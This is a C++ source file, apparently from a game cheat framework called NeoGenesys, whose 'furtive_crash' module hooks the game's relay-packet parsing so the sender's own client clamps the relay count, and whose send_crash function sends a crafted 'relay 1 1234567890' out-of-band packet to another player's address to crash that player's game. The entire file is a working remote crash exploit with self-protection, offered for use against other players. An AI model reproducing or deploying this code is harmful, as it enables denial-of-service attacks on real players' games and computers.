//=====================================================================================

#include "../../StdAfx.hpp"

//=====================================================================================

namespace furtive_crash
{
	int atoi_CL_HandleRelayPacket(const char* str)
	{
		if (_ReturnAddress() == (LPVOID)OFF_ATOICLHANDLERELAYPACKETRET)
			return min(std::stoul(str), 17ul);

		else
			return t6::atoi_CL_HandleRelayPacket(str);
	}
	/*
	//=====================================================================================
	*/
	void init()
	{
		AttachHook(t6::atoi_CL_HandleRelayPacket, atoi_CL_HandleRelayPacket);
	}
	/*
	//=====================================================================================
	*/
	void free()
	{
		DetachHook(t6::atoi_CL_HandleRelayPacket, atoi_CL_HandleRelayPacket);
	}
	/*
	//=====================================================================================
	*/
	void send_crash(int client_num)
	{
		Sleep(500);

		char buf[2048];
		msg_t msg;
		t6::MSG_Init(&msg, buf, sizeof buf);
		t6::MSG_WriteString(&msg, "relay 1 1234567890");

		netadr_s netadr;
		NeoGenesys::GetPlayerAddr((NeoGenesys::sNetAddr*)&netadr, (SessionData*)NeoGenesys::GetCurrentSession(), client_num);
		t6::NET_OutOfBandData(netsrc_t::NS_CLIENT1, netadr, msg.data, msg.cursize);
	}
	/*
	//=====================================================================================
	*/
	bool send_connectivity_test(int client_num)
	{
		if (const auto our_client_num = t6::Party_FindMemberByXUID((SessionData*)NeoGenesys::GetCurrentSession(), t6::Live_GetXuid((ControllerIndex_t)0)); our_client_num >= 0)
		{
			char buf[2048];
			msg_t msg;

			t6::MSG_Init(&msg, buf, sizeof buf);
			t6::MSG_WriteString(&msg, "vt");
			t6::MSG_WriteByte(&msg, our_client_num);
			t6::CL_SendPeerData((SessionData*)NeoGenesys::GetCurrentSession(), 0, netsrc_t::NS_CLIENT1, client_num, &msg, 1);

			return t6::CL_CanWeConnectToClient((SessionData*)NeoGenesys::GetCurrentSession(), our_client_num, client_num);
		}

		return false;
	}
}

//=====================================================================================